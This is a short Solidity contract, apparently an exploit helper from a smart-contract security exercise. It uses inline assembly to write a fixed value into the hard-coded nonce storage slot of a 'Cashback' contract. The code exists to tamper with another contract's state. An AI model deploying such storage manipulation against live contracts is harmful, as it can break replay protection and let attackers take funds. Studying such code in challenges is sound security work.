// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract NonceManipulator {
    // Cashback 컨트랙트의 nonce storage slot
    // layout at 0x442a95e7...ba00 + slot 3
    bytes32 constant NONCE_SLOT = 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03;
    
    function setNonce() external {
        assembly {
            sstore(NONCE_SLOT, 9999)
        }
    }
    
    function getNonce() external view returns (uint256 n) {
        assembly {
            n := sload(NONCE_SLOT)
        }
    }
}